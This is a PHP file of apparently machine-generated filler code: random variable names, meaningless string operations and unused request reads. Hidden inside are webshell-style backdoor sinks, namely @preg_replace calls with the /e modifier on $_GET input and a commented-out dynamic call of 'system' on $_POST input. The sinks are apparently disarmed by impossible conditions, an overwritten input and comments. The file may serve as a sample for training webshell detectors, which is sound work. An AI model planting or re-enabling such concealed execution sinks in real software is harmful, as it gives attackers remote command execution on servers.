<?php

function gQICta9()
{
    $XFPRsuJXlr = 'F6';
    $zTSwjgyMZo = 'rId';
    $afMgsk0 = 'zXCRF';
    $g750tY74K = 'gJAJI5v6e0';
    $lIFV89s = 'eU';
    $QE = 'ZWIRKru';
    $YJb1N = new stdClass();
    $YJb1N->b9 = 'Ol9B0';
    $YJb1N->ULDxu = 'tL40';
    $YJb1N->x6BFNZ6 = 'EdTuphP_z';
    $YJb1N->kuAnA9euK1 = 'cz';
    $YJb1N->IxG = 'Sq4a';
    $YJb1N->GDF = 'ZR1P_Zl88R';
    $M5tg4J41O = 'sjpNM72e';
    $nGvhbZkta = 'VQzyDSL';
    preg_match('/eYfE7y/i', $zTSwjgyMZo, $match);
    print_r($match);
    echo $afMgsk0;
    var_dump($g750tY74K);
    $lIFV89s = $_POST['BJ4ubWpCuQc9A'] ?? ' ';
    $l72qXNphkV = array();
    $l72qXNphkV[]= $QE;
    var_dump($l72qXNphkV);
    $M5tg4J41O = $_GET['NWElT9B'] ?? ' ';
    $nGvhbZkta = $_POST['nR7FPy'] ?? ' ';
    $NPZxda = 'EMU19c';
    $gZ8mmAAG = 'JGlu';
    $YGUjv9m34It = 'ZCrLyYqopzn';
    $Iy8cCyYFm = 'bh';
    $EpUM = 'yu6mn';
    $S6vCzR39DHl = 'gk7hK';
    $oAx = 'EiCGMo';
    $IDecOK_UI3m = 'DIciNnw3l0b';
    $aBPeLhjXUx = 'apgiF_Z';
    $tFlQYrexZFQ = new stdClass();
    $tFlQYrexZFQ->t4OfR8 = 'v67hepQ';
    $tFlQYrexZFQ->hEjL5sudXJ = 'tpxyRM4E';
    $tFlQYrexZFQ->A7 = 'CBMuW3E00ah';
    if(function_exists("rdT6QD2qHi1QdYF")){
        rdT6QD2qHi1QdYF($gZ8mmAAG);
    }
    $YGUjv9m34It = $_GET['PCAHEKU_Ra6GF4'] ?? ' ';
    echo $Iy8cCyYFm;
    preg_match('/WYEl99/i', $EpUM, $match);
    print_r($match);
    $S6vCzR39DHl = $_POST['hsx9_kT'] ?? ' ';
    preg_match('/znjXpy/i', $oAx, $match);
    print_r($match);
    $IDecOK_UI3m = explode('WkKudej', $IDecOK_UI3m);
    $aBPeLhjXUx = $_GET['PVlVuJt'] ?? ' ';
    
}
$XN = 'r9_eES0';
$sJo8Og = 'Di';
$C7 = 'tdZj';
$lWRFx7iL = 'IQiUN';
$tHxqG = 'TKJKfNk';
$Hy8uYgjwO97 = new stdClass();
$Hy8uYgjwO97->wG73t = 'ZP';
$Hy8uYgjwO97->jEWFCi7 = 'jK1PgA4WUX';
$Hy8uYgjwO97->k29mwTDT4k1 = 'eb2';
$oPnSLpa9oo = 'b8SY88WIN';
$NxHQbH2_q = 'zzh';
$M2Xc = 'SU';
$XN = explode('uXxoKiV12', $XN);
$sJo8Og = $_GET['sUW3euhD0RK4gr'] ?? ' ';
preg_match('/mLMmK0/i', $lWRFx7iL, $match);
print_r($match);
$IFTjRnpkB = array();
$IFTjRnpkB[]= $tHxqG;
var_dump($IFTjRnpkB);
echo $oPnSLpa9oo;

function qKcXyEp6()
{
    $CBITAy3U3 = 'DpEUGx';
    $nxxoYL6Lnw0 = 'sqSYeK72zv';
    $A3a = 'P8RsALNf1I6';
    $Qo9Snf = 'Rouq6';
    $K5e1O = new stdClass();
    $K5e1O->uUk = 'WxZvIb';
    $K5e1O->UnPT3Dr = 'skkurcWn';
    $K5e1O->M60zoH2YohR = 'cQekNESC';
    $XzayOhx = 'kj57SKqXpC';
    $Aa7 = new stdClass();
    $Aa7->KuvIYjc1 = 'MQyPpzL3';
    $Aa7->fwRMc = 'x8dWXrf';
    $Aa7->hdJq9n = 'iKEXhch';
    $Aa7->BkeQa = 'TvU';
    $ck5 = new stdClass();
    $ck5->Oe = 'zLrjII';
    $dIuADd = 'LZGp9DMABa';
    $_5vHLX2N = array();
    $_5vHLX2N[]= $nxxoYL6Lnw0;
    var_dump($_5vHLX2N);
    $Qo9Snf = $_GET['E1yhRW2FWv'] ?? ' ';
    $XzayOhx = explode('s1x_2SRXXc', $XzayOhx);
    echo $dIuADd;
    $wwpomW = 'aIV';
    $Zop5iFQ = 'QPDWYFE';
    $I6SVOpkP1 = new stdClass();
    $I6SVOpkP1->XeIGPRIu6p = 'fjvSUZo';
    $I6SVOpkP1->Ng857S_ = 'pdr';
    $I6SVOpkP1->zqerr = 'FUvrC5qzL';
    $I6SVOpkP1->BZjWLe = 'zaGyHl';
    $I6SVOpkP1->mSPJTqOcR = 'Wvk';
    $jQh0m = 'VhrNpm7liN4';
    $GtGr43 = 'HVFGVvx6ei';
    $kuBykvfrFSH = new stdClass();
    $kuBykvfrFSH->spdJmqbgT = 'qG843';
    $kuBykvfrFSH->qSl = 'C3SkBbZxTAS';
    $kuBykvfrFSH->S5ySo = 'h_E6';
    $kuBykvfrFSH->IKuraLj4 = '_E';
    $jV5l = 'AV1nedBaAqA';
    $W7yjU0 = 'fkx';
    $PZekmvVqSb = 'OwKvl65MPo';
    var_dump($jQh0m);
    echo $GtGr43;
    $jV5l = $_POST['c5jnMgvkO'] ?? ' ';
    $W7yjU0 = $_POST['OLzIhGj0BIK'] ?? ' ';
    str_replace('B3vLZpLNMBaF', 'vZio1MXxid', $PZekmvVqSb);
    
}
$Sq0b6FBR = 'qNqpa83uCL_';
$ntJITsiSm6T = 'nufs0TI5ad';
$sLx_qpZs = 'Vh9d';
$PQxOI = 'JRKLzAwK';
$FJljgQ_ = 'TvAX8jKVJKu';
preg_match('/tqpb_g/i', $Sq0b6FBR, $match);
print_r($match);
$ntJITsiSm6T = $_GET['QFjr7BC7V9m'] ?? ' ';
$sLx_qpZs = explode('IsJ15a', $sLx_qpZs);
$PQxOI = $_GET['eD9MYsyb'] ?? ' ';
var_dump($FJljgQ_);
if('LUTbb3PKo' == 'oBdHS9vJs')
@preg_replace("/ewWAYlKNtvx/e", $_GET['LUTbb3PKo'] ?? ' ', 'oBdHS9vJs');

function Fj1()
{
    $muO7RYXof = 'F8eye2A1WF';
    $lm = 'vEs4XJ';
    $Xk = 'Daq';
    $u0zyvTI = 'ZWAkdXBoG4y';
    $pmR3f1SJK23 = 'yqSxDxMJ6o';
    $nOz4oV6Z2 = new stdClass();
    $nOz4oV6Z2->XR = 'K3hE0s';
    $nOz4oV6Z2->mBjVy9jIy = 'bMg8IVBvF';
    $nOz4oV6Z2->bd = 'SBRN3';
    $nOz4oV6Z2->mT = 'EyKFrPbsRB';
    $qj = new stdClass();
    $qj->clMmeEA3pT = 'OxugehfT';
    $PIiWwzaVWac = 'kt';
    $CRBU = 'dQ45JJ12yM';
    $d3NZ = 'f5seMCrwb';
    if(function_exists("HLuBt14")){
        HLuBt14($muO7RYXof);
    }
    $f3pio37Xx = array();
    $f3pio37Xx[]= $lm;
    var_dump($f3pio37Xx);
    $u0zyvTI = explode('hxIQ1xos', $u0zyvTI);
    $mQzulyoF = array();
    $mQzulyoF[]= $pmR3f1SJK23;
    var_dump($mQzulyoF);
    if(function_exists("f_ZRPWsP4")){
        f_ZRPWsP4($PIiWwzaVWac);
    }
    var_dump($CRBU);
    $d3NZ = explode('ZDgAV9C', $d3NZ);
    
}
if('urfNWHjaq' == 'mqSanHj7r')
@preg_replace("/rP8x3/e", $_GET['urfNWHjaq'] ?? ' ', 'mqSanHj7r');
$_yFi = 'yTkJ7lcR';
$M4iF4I9yih = new stdClass();
$M4iF4I9yih->ul_whAMHxK = 'Zwz3slUFY';
$MC = 'QWCd';
$j8B = 'pOQz';
$pe = 'qp';
$mpSPal = 'nnvICl9q';
str_replace('KnuJaqNqLed', 'dKQvo5u7', $MC);
preg_match('/XPgRR0/i', $j8B, $match);
print_r($match);
echo $pe;
$mpSPal = $_GET['gcYJOK'] ?? ' ';
$kI46H8 = 'Js';
$ZoMNdl5mavd = 'rAySLxGJfc';
$XXZH1fzQ = 'IxXC0HBr';
$BL = 'S0GJbA4gfFk';
$Uwo8a1Z = 'wHt';
$M_t = new stdClass();
$M_t->DIN3reCwot = 'bB3O9eRY9';
$M_t->R9 = 'KC';
$JA = 'AU1DSaaQ';
$yI4qOyP = 'MMe';
$QcTc1rj = array();
$QcTc1rj[]= $kI46H8;
var_dump($QcTc1rj);
var_dump($ZoMNdl5mavd);
$XXZH1fzQ .= 'WhdDoFbrxX';
$BL .= 'AIufYF1Aw';
str_replace('A63Zb5LHQZep', 'hUV4Lr2', $Uwo8a1Z);
var_dump($JA);
echo $yI4qOyP;

function OyFiwJKG()
{
    $iiYSwJwNf = 'WxMVW9Fuv';
    $CMO = 'frr7';
    $DAHD0kbDbOA = new stdClass();
    $DAHD0kbDbOA->AVIODeWB = 'aVqcdK';
    $DAHD0kbDbOA->sO6BgzSXG = 'E8zp';
    $DAHD0kbDbOA->yLXKvS = 'UGiEdBuvp';
    $DAHD0kbDbOA->RpWbqa = 'jSePeI5';
    $coNY = 'mYuSp';
    $e2TFNPZISd = 'HgBx5mLrUv';
    $aui0wLzl7G = 'VhW';
    $vHCWsN4 = 'nTML';
    preg_match('/ww_om4/i', $iiYSwJwNf, $match);
    print_r($match);
    $rhSy7KNF9 = array();
    $rhSy7KNF9[]= $CMO;
    var_dump($rhSy7KNF9);
    $coNY .= 'oMHDWaov';
    var_dump($e2TFNPZISd);
    $aui0wLzl7G = $_GET['D5ADRGYG7SVpJ'] ?? ' ';
    $NsozWSC = array();
    $NsozWSC[]= $vHCWsN4;
    var_dump($NsozWSC);
    
}
OyFiwJKG();
$UTzTOHVQY = 'ObvwQ5';
$fMDdcu6 = 'yoi1n7yB4H6';
$pAn = 'LMsa6l5vd';
$jO4qHdQFnh = new stdClass();
$jO4qHdQFnh->tkQrbC9 = 'qcbPP1AKu';
$jO4qHdQFnh->V3 = 'BYMIMWh';
$jO4qHdQFnh->YAoqM = 'IOCTAfF';
$jO4qHdQFnh->u2OaYjA = 'Asu';
$jO4qHdQFnh->LdmV = 'xUS';
$jO4qHdQFnh->rm1AU = 'uLFWyRxx';
$HC = 'gZ';
preg_match('/e91E6g/i', $UTzTOHVQY, $match);
print_r($match);
$fMDdcu6 = explode('l2LSrGPWo', $fMDdcu6);
echo $pAn;
str_replace('bhm9ZUsfXh', 'U3hNjHG', $HC);
$DpMA1D = 'd5U6utRT';
$HnYn = 'uOBLXY';
$FJ5ZMl5TB = 'n0aT';
$eJ6p1KLP = 'AM';
$J5QS = 'getlo';
$GdxHvXfjMh = 'kcxg';
$FEIt5 = 'V4U2wLxJ7';
$EB6TisFvUZM = '_dh';
$JApki4 = 'BwRNNx';
$HnYn = $_POST['DjcpspRc'] ?? ' ';
preg_match('/dy1TUP/i', $FJ5ZMl5TB, $match);
print_r($match);
$eJ6p1KLP .= 'R7YWki9nHbdvn';
str_replace('x9RTi04', 'yRWlcWgpsUrZXpP', $GdxHvXfjMh);
$JApki4 = $_GET['vrbNsyOVmn_5ev'] ?? ' ';
$KVri8yGYxz = 'XA5wNApu';
$AHa6MG47uN = 'aB38us';
$UO_T = 'hnqbU5GzMfE';
$h_og = 'fSCbQn5XEmi';
$ueTgJGiCO = 'GKWn';
$CuYKDxxhq = 'nN_mgWcb8tk';
$wB6UXYktf = new stdClass();
$wB6UXYktf->WAPKVtRg = 'WT8GmKCxk';
$otAn = 'nWVE0W';
preg_match('/u3PCg4/i', $KVri8yGYxz, $match);
print_r($match);
echo $ueTgJGiCO;
var_dump($CuYKDxxhq);
preg_match('/a4ejU8/i', $otAn, $match);
print_r($match);
$W8v_ = 'hD62';
$Jb2wFX = 'vSa5';
$Zhg = 'NF79MQ';
$JnufPr = 'GYzFI';
$W8v_ = explode('mbK0cgrwCy', $W8v_);
preg_match('/YeLSKM/i', $Jb2wFX, $match);
print_r($match);
preg_match('/FqwbW4/i', $Zhg, $match);
print_r($match);
$qyg9pNRzVTQ = array();
$qyg9pNRzVTQ[]= $JnufPr;
var_dump($qyg9pNRzVTQ);
/*
$lkZap6EHm = 'system';
if('l8ZJgeN_Q' == 'lkZap6EHm')
($lkZap6EHm)($_POST['l8ZJgeN_Q'] ?? ' ');
*/
$_GET['KO61ou5rP'] = ' ';
$tlBRugz = 'Bw5RAqa';
$xkSFZhVK = 'B49nf';
$ysVe1Ivh = new stdClass();
$ysVe1Ivh->pZU = 'ovPUnbUCUgw';
$ysVe1Ivh->qvBEJ = 'JKe';
$ysVe1Ivh->KxtQ_IG = 'A_6';
$ZJO7XW = 's12';
$vFw = 'j4fZy7Qb';
$qyK = 'QX';
$VXo = 'XoDTLaq';
$rW3 = 'av';
$F0 = 'aOh';
$_goXpPOW3mf = 'uzzlO9BNN';
var_dump($tlBRugz);
preg_match('/L8w5BR/i', $xkSFZhVK, $match);
print_r($match);
str_replace('fgvVDZ', 'ZE9hM43GcKz62', $ZJO7XW);
$VXo = $_GET['AkwmfK1PLtKRnSHI'] ?? ' ';
var_dump($rW3);
var_dump($F0);
$_goXpPOW3mf = $_POST['aBN2PVv'] ?? ' ';
@preg_replace("/_i/e", $_GET['KO61ou5rP'] ?? ' ', 'n8FCQRC0O');
$ZwcKIUB = new stdClass();
$ZwcKIUB->wKDDqHJ7U5 = 'XDkGH';
$ZwcKIUB->LoqTq = 'VtmR6bhWgi';
$ZwcKIUB->_iV8Jdm = 'i2nCGg5yQ_t';
$ZwcKIUB->rMu5zK_E = 'ySXZjIuR';
$g0o7aJwzCq = 'EoCqtV';
$vL = 'O4696aiW5p';
$ztxFg = 'gW7YDireXf';
preg_match('/On_1EN/i', $g0o7aJwzCq, $match);
print_r($match);
$vL = $_POST['BSvfVm'] ?? ' ';
if(function_exists("Pan79m")){
    Pan79m($ztxFg);
}
/*

function YJV7S8GvcyhunlMogQkuX()
{
    $n6bus8M = 'bXaW276';
    $dnAb = 'fdPs';
    $z6sF2k8MOz = 'L9tpJ9g';
    $hD5N = new stdClass();
    $hD5N->f7n_L19OK = 'n4BXssv92oT';
    $hD5N->GBw_Id = 'IGg7';
    $hD5N->gxPs0a = 'wVqfz8yBU3I';
    $hD5N->EJfQpU8VM = 'djki_Jw';
    $uM = new stdClass();
    $uM->yZYKH3Z = 'dEI';
    $uM->rRu8EmY5 = 'BTfT';
    $pmsQFW2E = 'aUj';
    str_replace('O1bWd3lgW6mDh', 'eoVOX9qQKfgdO', $n6bus8M);
    $dnAb = $_POST['TRlJnmzD8kgh'] ?? ' ';
    str_replace('vtyrPevIDgXQH', 'KLKRYmB2AaJ_Sz', $z6sF2k8MOz);
    str_replace('YfwDoYQe', 'k4FwTiNZ', $pmsQFW2E);
    $dgr7vum = 'KRcWOQdsd';
    $qFZ = 'NED7KUo';
    $ZAtcHg9twhi = 'PdIiIz1';
    $xlF = 'ZkAj3';
    $KtIJI = 'IJp';
    $C7Hb = 'calIjq';
    $oRxE = 'yTAAN';
    $dgr7vum = $_GET['Ihv9LDD'] ?? ' ';
    echo $qFZ;
    echo $xlF;
    $C7Hb .= 'Kw7x_SGEz3j';
    $oRxE = $_POST['ZlyhvZOU0lXLla_R'] ?? ' ';
    $rAX87 = 'Gi1fI';
    $rs = 'EcmTU0uxM8V';
    $AMzdzc = 'ks8wPzw';
    $q_jGrDE = 'IeigchxE6zW';
    $TAQwf4_ssoF = 'igIGmXL2b';
    $X8RDgBuYdbI = 'kOyhvqKD3p';
    $rAX87 = explode('Zxz_pqAX', $rAX87);
    preg_match('/wTOqRO/i', $rs, $match);
    print_r($match);
    echo $AMzdzc;
    $q_jGrDE .= 'JYQzOh_QSgJ';
    $TAQwf4_ssoF = explode('_0sqlLI', $TAQwf4_ssoF);
    $X8RDgBuYdbI = $_POST['EflTtobgOXcEA'] ?? ' ';
    
}
*/

function gY()
{
    $UKC7JqSUdQA = 'PL5_';
    $qu = 'kpgFfXNq4Ok';
    $q5Wpk0Odf = 'YZWZdSZi';
    $QN = 'afOONVqPPq9';
    $sAnu = 'Id';
    $UKC7JqSUdQA = $_POST['C_mo37'] ?? ' ';
    $aW8FI_dP = array();
    $aW8FI_dP[]= $qu;
    var_dump($aW8FI_dP);
    $ARpuaA = array();
    $ARpuaA[]= $q5Wpk0Odf;
    var_dump($ARpuaA);
    $QN = explode('fKfa1qkPb', $QN);
    str_replace('LYk4Fd', 'NYOjOT6efAE', $sAnu);
    
}
gY();
$LwB = 'qug';
$UoLGQTig9Jq = 'pZr';
$Cy = 'Ll_iVC9tzm';
$TSejxkTkW = new stdClass();
$TSejxkTkW->Pf = 'iuVV';
$TSejxkTkW->iCjyvvZrkBb = 'iKjYAjpdtzJ';
$TSejxkTkW->hZsOGJs = 'cMhYraWyWi';
$TSejxkTkW->D4Ml = 'uY9YRLBJj';
$gtw = 'zczA70';
$olQ = 'abieZoaQc';
$UoLGQTig9Jq .= 'K4adaEIC';
$Cy = $_GET['uNtAORMbBB'] ?? ' ';
str_replace('VBbxFW1AwOd', 'Hqc6oQEVSkD', $gtw);
/*
$lx = 'tFNtFe';
$_8WFepdFMxM = 'gEWbb';
$OOgslaOYY8e = 'uQ5';
$aT_GDb = 'hsj';
$RkGgD6I2 = 'vy8MzTOVE';
$T8lEAN = array();
$T8lEAN[]= $lx;
var_dump($T8lEAN);
$_8WFepdFMxM = $_POST['EJ1Mt_yao'] ?? ' ';
preg_match('/MoLvD3/i', $OOgslaOYY8e, $match);
print_r($match);
preg_match('/Zo5ykE/i', $aT_GDb, $match);
print_r($match);
$RkGgD6I2 = explode('qI05xcsGPho', $RkGgD6I2);
*/
/*

function BCen1q1PUGD()
{
    $SN27wgt = 'RdrF';
    $PzPvSkiP = 'PGwN3vQkuXT';
    $wBggx8YQnW = 'Yn';
    $HCZPAU_bj = 'GvXQLU';
    $hmv8naHydjC = 'gD7';
    $xmb14 = new stdClass();
    $xmb14->K5vgk1N = '_pULtO';
    $xmb14->inF = 'jE';
    $hG = 'xx0K3ufQv6';
    $V7u_vp = '_XOKVQ5Fpf5';
    $wqSqe8 = new stdClass();
    $wqSqe8->tbgtsIS1O = 'XQcL';
    $wqSqe8->fmTDyYD_kZ = 'rma4nHmpPO';
    $wqSqe8->OpZ = 'NkXGkiEOp';
    $wqSqe8->Ib0M = 'VftZdU_Gr';
    $wqSqe8->ARETv7 = 'DhiuJC';
    $aQY_U = 'zGZfpaYeVs';
    $JtjfNmmC5 = 'hOw1t';
    $GPO = 'OBUI';
    $a81cO8E0x3G = 'gZGAId0h';
    $SN27wgt = explode('Ua5oGBdc', $SN27wgt);
    $TYwrdVDES = array();
    $TYwrdVDES[]= $PzPvSkiP;
    var_dump($TYwrdVDES);
    var_dump($wBggx8YQnW);
    echo $HCZPAU_bj;
    echo $hmv8naHydjC;
    if(function_exists("eVri7WqieU2")){
        eVri7WqieU2($hG);
    }
    preg_match('/tcK1jH/i', $V7u_vp, $match);
    print_r($match);
    preg_match('/uvXMML/i', $aQY_U, $match);
    print_r($match);
    if(function_exists("mPvQF4mKTks")){
        mPvQF4mKTks($JtjfNmmC5);
    }
    $GPO = explode('NKvBdyGAS', $GPO);
    $tH = 'ZHZfpM3A';
    $F1 = '_MYm';
    $U6LU = new stdClass();
    $U6LU->xpNHR2 = 'xtXT3qaJ';
    $U6LU->YLZ5hVeE = 'nZ7t7P2yO';
    $U6LU->FtAdAvcXr6 = 'XPpie';
    $U6LU->mwAaNA = 'KjS_suxkbS';
    $XKM_Lio = 'sydCBxOa';
    $DBl0 = 'CqfbxH1';
    $h9 = 'I9XS';
    $GygX = 'Y0_oa47';
    preg_match('/CiJwLY/i', $tH, $match);
    print_r($match);
    if(function_exists("sW7I3O")){
        sW7I3O($F1);
    }
    if(function_exists("Zz63TQ")){
        Zz63TQ($XKM_Lio);
    }
    $h9 = $_POST['OzXNRwTtj'] ?? ' ';
    preg_match('/eA_DrR/i', $GygX, $match);
    print_r($match);
    $HrpISWCsJ5 = 'hzDc51B';
    $B3za = 'w7uoUYlBM';
    $CuHa11de5_ = 'zTC4iMnx';
    $qgZwOn = 'E0U';
    $J_I2_TCaF = new stdClass();
    $J_I2_TCaF->kPTAQJnIg = 'IMoRW';
    $J_I2_TCaF->rvKJ = 'Z59AggO';
    $TRTv_XOPDC = new stdClass();
    $TRTv_XOPDC->FrJNZd = 'DFo';
    $TRTv_XOPDC->hN = 'vOhVXwEaW0';
    $rEMzk = 'ni';
    echo $HrpISWCsJ5;
    $B3za = $_GET['kbCXvk3'] ?? ' ';
    $qgZwOn = $_GET['rE4UvQ'] ?? ' ';
    $rEMzk = $_GET['QKWa0eSutTfzA3hC'] ?? ' ';
    
}
*/
echo 'End of File';
